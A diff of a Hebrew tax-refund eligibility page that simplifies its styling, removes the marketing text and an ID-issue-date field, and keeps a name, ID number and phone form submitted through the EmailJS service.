@@ -4,198 +4,129 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>בדיקת זכאות להחזר מס</title>
-  <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;500;700&display=swap" rel="stylesheet">
   <style>
     body {
-        margin:0;
-        font-family:'Rubik',sans-serif;
-        color:#333;
-        overflow-x:hidden;
-        background: #f0f4f8;
+        font-family: Arial, sans-serif;
+        background: #f4f4f4;
+        margin: 0;
+        padding: 0;
     }
-
-    /* גל רקע נע */
-    body::before {
-        content:"";
-        position:fixed;
-        top:0; left:0; width:200%; height:200%;
-        background: radial-gradient(circle at 25% 25%, rgba(255,235,59,0.05) 10%, transparent 10%),
-                    radial-gradient(circle at 75% 75%, rgba(76,175,80,0.05) 10%, transparent 10%);
-        background-size:50% 50%;
-        animation: waveBg 30s linear infinite;
-        z-index:-1;
+    .form-container {
+        max-width: 600px;
+        margin: 50px auto;
+        background: #fff;
+        padding: 30px;
+        border-radius: 10px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
     }
-    @keyframes waveBg {
-        0%{transform:translate(0,0);}
-        50%{transform:translate(-50px,-50px);}
-        100%{transform:translate(0,0);}
+    h1 {
+        text-align: center;
     }
-
-    /* HEADER */
-    header {
-        background: linear-gradient(270deg,#2E7D32,#4CAF50,#81C784,#43A047);
-        background-size:800% 800%;
-        animation: headerGradient 15s ease infinite;
-        color:white;
-        text-align:center;
-        padding:80px 20px;
-        position:relative;
-        overflow:hidden;
+    .form-group {
+        margin-bottom: 15px;
     }
-    header h1 {
-        font-size:3em;
-        margin-bottom:10px;
-        background: linear-gradient(270deg,#FFEB3B,#FFC107,#FF9800);
-        background-size:800% 800%;
-        -webkit-background-clip: text;
-        -webkit-text-fill-color: transparent;
-        animation: textGradient 8s ease infinite;
+    label {
+        font-size: 16px;
+        margin-bottom: 5px;
+        display: block;
     }
-    header p {font-size:1.3em; animation: fadeIn 2s ease;}
-
-    @keyframes headerGradient {0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
-    @keyframes textGradient {0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
-    @keyframes fadeIn {from {opacity:0;} to {opacity:1;}}
-
-    /* POPUP */
+    input {
+        width: 100%;
+        padding: 10px;
+        font-size: 16px;
+        margin: 5px 0;
+        border-radius: 5px;
+        border: 1px solid #ccc;
+    }
+    button {
+        width: 100%;
+        padding: 12px;
+        background-color: #4CAF50;
+        color: #fff;
+        font-size: 18px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+    }
+    button:hover {
+        background-color: #45a049;
+    }
     .popup {
-        display:none;
-        position:fixed;
-        top:50%;
-        left:50%;
-        transform:translate(-50%,-50%);
-        background:white;
-        padding:50px 40px;
-        border-radius:20px;
-        box-shadow:0 15px 40px rgba(0,0,0,0.25);
-        z-index:100;
-        text-align:center;
-        font-size:1.3em;
-        color:#2E7D32;
-        min-width:320px;
+        display: none;
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: white;
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        z-index: 100;
     }
     .loader {
-        border:6px solid #f3f3f3;
-        border-top:6px solid #4CAF50;
-        border-radius:50%;
-        width:50px;
-        height:50px;
-        margin:20px auto;
-        animation:spin 1s linear infinite;
+        border: 6px solid #f3f3f3;
+        border-top: 6px solid #4CAF50;
+        border-radius: 50%;
+        width: 50px;
+        height: 50px;
+        margin: 20px auto;
+        animation: spin 1s linear infinite;
     }
-    @keyframes spin {100% {transform:rotate(360deg);}}
-
-    /* FORM */
-    form {
-        position:relative;
-        display:flex;
-        flex-direction:column;
-        background: linear-gradient(135deg,#fff3e0,#ffe0b2);
-        padding:30px;
-        border-radius:20px;
-        box-shadow:0 10px 25px rgba(0,0,0,0.1);
-        transition: transform 0.3s ease, box-shadow 0.3s ease;
+    @keyframes spin {
+        100% { transform: rotate(360deg); }
     }
-    form:hover {transform: translateY(-3px); box-shadow:0 15px 30px rgba(0,0,0,0.12);}
-    .form-group {margin-bottom:15px;}
-    label {margin-bottom:5px;font-weight:500;display:block;color:#333;}
-    input {padding:12px;font-size:1em;border-radius:10px;border:1px solid #ccc;width:100%;}
-    input:focus {border-color:#4CAF50;outline:none;box-shadow:0 0 8px rgba(76,175,80,0.4);}
-    button {
-        background: linear-gradient(270deg,#FF9800,#F44336,#FF5722,#FF7043);
-        background-size:400% 400%;
-        color:white;
-        padding:15px;
-        font-size:1.2em;
-        border:none;
-        border-radius:12px;
-        cursor:pointer;
-        margin-top:10px;
-        animation: buttonGradient 5s ease infinite;
-        transition: transform 0.3s ease, box-shadow 0.3s ease;
-    }
-    button:hover {transform: scale(1.08); box-shadow:0 10px 25px rgba(0,0,0,0.2);}
-    @keyframes buttonGradient {0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
-
   </style>
 </head>
 <body>
 
-<header>
-  <h1>בדוק את זכאותך להחזר מס!</h1>
-  <p>מילוי קצר – החזר עד 6 שנים אחורה. אל תחכה – מגיע לך החזר על הכסף שלך!</p>
-</header>
-
-<div class="container">
-  <section>
-    <h2>למה כדאי לפנות אלינו?</h2>
-    <p>בדיקה חינם וקלה – אנחנו נחשב ונראה מה מגיע לך. כל התהליך פשוט, מהיר ומקצועי!</p>
-    <ul class="bullets">
-      <li>החזרי מס עד 6 שנים אחורה</li>
-      <li>מתאים למי שהחליף מספר מקומות עבודה</li>
-      <li>ללא תשלום מראש – מקצועיות מלאה</li>
-      <li>תהליך מהיר, ידידותי ומותאם לך</li>
-    </ul>
-  </section>
-
-  <section>
-    <h2>מלא את פרטיך עכשיו או בדוק זכאותך</h2>
+  <div class="form-container">
+    <h1>בדוק זכאות להחזר מס</h1>
     <form id="taxForm">
       <div class="form-group">
         <label for="full-name">שם מלא</label>
-        <input type="text" id="full-name" name="full-name" placeholder="הזן את שמך" required>
+        <input type="text" id="full-name" name="full-name" required>
       </div>
       <div class="form-group">
         <label for="id-number">תעודת זהות</label>
-        <input type="text" id="id-number" name="id-number" placeholder="מספר תעודת זהות" required maxlength="9" pattern="[0-9]{9}" title="תעודת זהות חייבת להכיל 9 ספרות">
-      </div>
-      <div class="form-group">
-        <label for="id-date">תאריך הנפקה של תעודת זהות</label>
-        <input type="date" id="id-date" name="id-date" required>
+        <input type="text" id="id-number" name="id-number" required pattern="\d{9}" maxlength="9">
       </div>
       <div class="form-group">
         <label for="phone">נייד</label>
-        <input type="tel" id="phone" name="phone" placeholder="נייד ליצירת קשר" required maxlength="10" pattern="[0-9]{10}" title="נייד חייב להכיל 10 ספרות">
+        <input type="tel" id="phone" name="phone" required pattern="\d{10}" maxlength="10">
       </div>
-      <button type="submit">בדוק זכאותך</button>
+      <button type="submit">שלח בקשה</button>
     </form>
-  </section>
-</div>
+  </div>
 
-<footer>
-  &copy; 2026 החזרי מס פרימיום | כל הזכויות שמורות
-</footer>
+  <div class="popup" id="popup">
+    <p>אנחנו בודקים את זכאותך...</p>
+    <div class="loader"></div>
+  </div>
 
-<!-- Popup for Loading -->
-<div class="popup" id="popup">
-  <div id="popup-text">בודק את זכאותך...</div>
-  <div class="loader"></div>
-</div>
+  <script type="text/javascript">
+    emailjs.init("t2eGSdp94pjW_SynR"); // הוספת ה-User ID שלך מ-EmailJS
 
-<script type="text/javascript">
-  emailjs.init("2SrvifCBL6qrfwiA4"); // הוסף את ה-User ID שלך מ-EmailJS
+    document.getElementById('taxForm').addEventListener('submit', function(e) {
+      e.preventDefault();
 
-  document.getElementById('taxForm').addEventListener('submit', function(e) {
-    e.preventDefault();
+      // הצג את הפופ-אפ
+      document.getElementById('popup').style.display = 'block';
 
-    // הצג את הפופ-אפ
-    document.getElementById('popup').style.display = 'block';
-
-    // שלח את הנתונים ל-EmailJS
-    emailjs.sendForm('service_qgukpno', 'template_d7lfkgq', this)
-      .then(function(response) {
-        console.log('SUCCESS', response);
-        alert('הבקשה שלך נקלטה בהצלחה!');
-        // הסתר את הפופ-אפ לאחר שליחה מוצלחת
-        document.getElementById('popup').style.display = 'none';
-      }, function(error) {
-        console.log('FAILED', error);
-        alert('שגיאה בשליחת המייל, נסה שנית');
-        // הסתר את הפופ-אפ במקרה של שגיאה
-        document.getElementById('popup').style.display = 'none';
-      });
-  });
-</script>
+      // שלח את הנתונים ל-EmailJS
+      emailjs.sendForm('service_qgukpno', 'template_d7lfkgq', this)
+        .then(function(response) {
+          console.log('SUCCESS', response);
+          alert('הבקשה שלך נקלטה בהצלחה!');
+          // הסתר את הפופ-אפ לאחר שליחה מוצלחת
+          document.getElementById('popup').style.display = 'none';
+        }, function(error) {
+          console.log('FAILED', error);
+          alert('שגיאה בשליחת המייל, נסה שנית');
+          // הסתר את הפופ-אפ במקרה של שגיאה
+          document.getElementById('popup').style.display = 'none';
+        });
+    });
+  </script>
 
 </body>
 </html>
